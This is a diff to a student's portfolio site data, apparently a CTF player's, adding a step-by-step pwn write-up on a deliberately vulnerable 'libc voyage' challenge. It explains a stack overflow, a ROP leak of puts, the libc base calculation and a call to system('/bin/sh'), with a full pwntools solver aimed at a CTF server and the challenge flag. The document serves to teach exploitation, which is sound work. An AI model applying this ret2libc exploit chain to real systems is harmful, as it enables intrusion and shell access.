@@ -3,7 +3,47 @@
   "type": "page",
   "title": "./0xb00b4_",
   "body": "Networking student at INSAT & CTF player based in Tunisia.\nBinary exploitation, reverse engineering and low-level systems.\n\n::btn GitHub | https://github.com/Hajbooba\n::btn CTFtime | https://ctftime.org\n::btn Discord | https://discord.com/users/877314305207455805\n\n## skills\n::bar Pwn 60\n::bar Reverse Engineering 50\n::bar Forensics 40\n::bar OSINT 40",
-  "imgs": {}
+  "imgs": {},
+  "layout": [
+   {
+    "id": "home",
+    "on": true
+   },
+   {
+    "id": "writeups",
+    "on": true,
+    "title": "Writeups",
+    "sub": "Challenges I solved, explained step by step.",
+    "limit": 12
+   },
+   {
+    "id": "projects",
+    "on": true,
+    "title": "Projects",
+    "sub": "Things I built, and what I learned building them.",
+    "limit": 4
+   },
+   {
+    "id": "achievements",
+    "on": true,
+    "title": "Achievements",
+    "sub": "Ranks, results and recognition.",
+    "limit": 6
+   },
+   {
+    "id": "experience",
+    "on": true,
+    "title": "Experience",
+    "sub": "Where I have worked and what I did there.",
+    "limit": 4
+   },
+   {
+    "id": "about",
+    "on": true,
+    "title": "About",
+    "sub": "A little more about me."
+   }
+  ]
  },
  "about": {
   "type": "page",
@@ -275,6 +315,25 @@
        "shellcoding"
       ],
       "role": "player"
+     },
+     "libc-voyage": {
+      "type": "file",
+      "title": "libc voyage.md",
+      "date": "2026-10-15",
+      "category": "pwn",
+      "pts": "500",
+      "body": "This one’s a step up from the earlier ROP challenges, there’s no win() function hiding in the binary this time. Let's see how we can win this challenge... \n\n{u|**Checking the binarys' protection :**} \n\n![image](img:imva3ldnog8z)\n\nOkey nice, no canary neither pie is enabled, this will be so helpful for us. \n\nlet's test the binary and see what does it do : \n\n![image](img:imva3nm0nqo4)\nHmm nothing interesting came from these test. Let's take a look at the provided source code: \n\n{u|**Analyzing the source code :**}  \n\n```c\nvoid voyage(void) {\n    char ship_log[64];\n    puts(\"Log your expedition coordinates:\");\n    // Bounded overflow: reads up to 160 bytes into 64-byte buffer\n    read(0, ship_log, 160);\n    puts(\"Coordinates received. Sailing onward!\");\n}\n\n```\nNice, we found the bug, a classic buffer overflow as we are allowed to write `160` bytes into a `64` bytes buffer. \n\n```c\n// Built-in helper to guarantee the presence of clean ROP gadgets\nvoid gadget_anchor(void) {\n    __asm__(\n        \"pop %rdi; ret;\\n\"\n        \"ret;\\n\"\n    );\n}\n```\nAlso They’ve given us a pop `rdi; ret` gadget (so we can control a function’s first argument) and a lone `ret` gadget. We’ll get to why that bare ret matters later, it looks useless but it’s actually solving a real problem.\nThe question here, how are we going to win this challenge? There’s no win() function this time, so a simple ret2win is out. There’s no format string bug either, so we can’t leak or write memory that way. And NX is enabled, so we can’t drop shellcode on the stack and jump to it like in iron_chamber. All we actually have is a `plain buffer overflow`, which only gives us control over the return address and the ability to chain function calls via `ROP`.\nTo solve this challenge we are going to use a technique called `ret2libc`.\n{u|**what is ret2libc, actually?**}\n\nEvery program that calls normal functions like `puts`, `printf`, or 'system' doesn’t contain the code for those functions itself, it calls out to 'libc', a shared library loaded into memory alongside the program at runtime. The actual machine code for 'system()' lives inside 'libc', not inside our binary.\n\nHere’s the fact that makes this whole attack possible: libc always loads as one single contiguous block in memory. The distance between any two functions inside it is always exactly the same, because that spacing is baked into the compiled library and never changes. The only unknown is where that whole block starts in memory, since 'ASLR' randomizes that starting point (“the base address”) every time the program runs. \nSo if we can find out the real runtime address of just one libc function, we can calculate libc’s base address, and from there we know the address of every single function in it, including `system()`.\n\nSo we now know that our exploit will be on 2 stages : \n**1.** Leak the real address of some libc function (we’ll use puts) by making the program print it back to us.\n**2.** Calculate libc’s base from that leak, then use it to call `system(\"/bin/sh\")` and pop a shell.\n\n{u|**stage 1: leaking a libc address**}\n\n```python\npayload  = b'A' * OFFSET           # padding up to the saved return address\npayload += p64(pop_rdi_ret)        # gadget: pop next value into rdi, then ret\npayload += p64(elf.got['puts'])    # arg for next call: address of puts' GOT slot\npayload += p64(elf.plt['puts'])    # call puts() -> prints puts' real address (the leak)\npayload += p64(main_addr)          # jump back to main() to send a second payload\n```\nIf we send that, the program prints raw bytes back at us, that’s our leak.\n\n```python\nio.recvuntil(b'Sailing onward!\\n')\nleak = io.recvline()\nleaked_puts = u64(leak.ljust(8, b'\\x00'))\n```\nWe grab what got printed and unpack it as a 64-bit address. The `ljust` padding is just in case the address ends in a null byte that got the print cut short.\n\n\n```python\nif leaked_puts < 0x700000000000 or leaked_puts > 0x800000000000:\n    log.warning(\"bad leak, retrying...\")\n    io.close()\n    return None\n```\nThis is just a quick sanity check, libc addresses on x86-64 always fall in this range. If it doesn’t look right, we just reconnect and try again instead of continuing with garbage.\n**Calculating libc address:**\n::center libc.address = leaked_puts - libc.symbols['puts'] \n`leaked_puts` is where puts actually landed this run. `libc.symbols['puts']` is a fixed offset, how far into the libc file puts sits, which never changes. Subtract one from the other and we get libc’s real base address for this run.\nOnce `libc.address` is set, `pwntools` automatically gives us correct addresses for anything else in libc we ask for, like `system()`.\n\nWe also need the string `\"/bin/sh\"` somewhere in memory. Handy fact: libc already has that string built in, so we just search for it instead of writing our own.\n```python\nbinsh = next(libc.search(b'/bin/sh\\x00'))\n```\n{u|**Stage 2: popping the shell**}\n\n```python\npayload  = b'A' * OFFSET\npayload += p64(ret)                     # fixes stack alignment before calling system()\npayload += p64(pop_rdi_ret)\npayload += p64(binsh)                   # arg for system(): \"/bin/sh\"\npayload += p64(libc.symbols['system'])\n```\nThat spare `ret` gadget from earlier finally earns its keep here. system() expects the stack aligned to `16` bytes when it’s called, and our gadget chain can throw that off by 8 bytes. One extra bare ret eats those 8 bytes and fixes the alignment, skip it and system() can crash with no obvious reason why.\n\nThe rest is the same pattern as before: `pop_rdi_ret` sets `rdi` to our `\"/bin/sh\"` string, then we jump straight into `system()`. Functionally identical to the binary calling `system(\"/bin/sh\")` itself.\nNow if we collect all parts together we can get our working solver: \n\n{u|**Solver.py**}\n\n```python\nfrom pwn import *\n\ncontext.binary = elf = ELF('./libc_voyage', checksec=False)\nlibc = ELF('./libc.so.6', checksec=False)\n\nOFFSET      = 72\npop_rdi_ret = 0x4011e3\nret         = 0x40101a\nmain_addr   = elf.symbols['main']\n\ndef try_exploit():\n    #io = process([elf.path])\n    io = remote('pwn.securinets-enit.club', 1311)   # no LD_PRELOAD needed for remote — it uses its own libc\n\n    payload1  = b'A' * OFFSET\n    payload1 += p64(pop_rdi_ret)\n    payload1 += p64(elf.got['puts'])\n    payload1 += p64(elf.plt['puts'])\n    payload1 += p64(main_addr)\n\n    io.recvuntil(b'coordinates:')\n    io.sendline(payload1)\n\n    io.recvuntil(b'Sailing onward!\\n')\n    leak = io.recvline()\n    leak = leak[:-1] if leak.endswith(b'\\n') else leak\n    leaked_puts = u64(leak.ljust(8, b'\\x00'))\n\n    if leaked_puts < 0x700000000000 or leaked_puts > 0x800000000000:\n        log.warning(f\"bad leak ({hex(leaked_puts)}), retrying...\")\n        io.close()\n        return None\n\n    log.info(f\"leaked puts@libc: {hex(leaked_puts)}\")\n    libc.address = leaked_puts - libc.symbols['puts']\n    log.info(f\"libc base: {hex(libc.address)}\")\n\n    binsh = next(libc.search(b'/bin/sh\\x00'))\n    payload2  = b'A' * OFFSET\n    payload2 += p64(ret)\n    payload2 += p64(pop_rdi_ret)\n    payload2 += p64(binsh)\n    payload2 += p64(libc.symbols['system'])\n\n    io.recvuntil(b'coordinates:')\n    io.sendline(payload2)\n    return io\n\nio = None\nwhile io is None:\n    io = try_exploit()\n\nio.interactive()\n```\n",
+      "imgs": {
+       "imva3ldnog8z": "images/56c4764dab02103f.jpg",
+       "imva3nm0nqo4": "images/1599fa537faba219.jpg"
+      },
+      "flag": "SecurinetsENIT{tw0_st4g3_r0p_l1bc_l34k_r3t2l1bc_m4st3ry_9024}",
+      "fhide": true,
+      "flagLabel": "flag.txt",
+      "tags": [
+       "ret2libc"
+      ],
+      "role": "player"
      }
     }
    }
@@ -308,7 +367,7 @@
     "link": "",
     "body": "",
     "imgs": {},
-    "rank": "3rd"
+    "rank": "3rd/9th"
    }
   },
   "kind": "rank"
